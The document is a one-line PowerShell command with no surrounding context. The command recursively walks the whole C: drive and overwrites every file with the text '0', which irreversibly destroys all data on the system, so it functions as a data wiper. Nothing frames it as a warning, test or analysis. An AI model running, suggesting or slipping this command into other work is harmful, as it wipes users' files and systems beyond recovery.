gci c:\ -r | foreach -process {Set-Content $_ "0"}
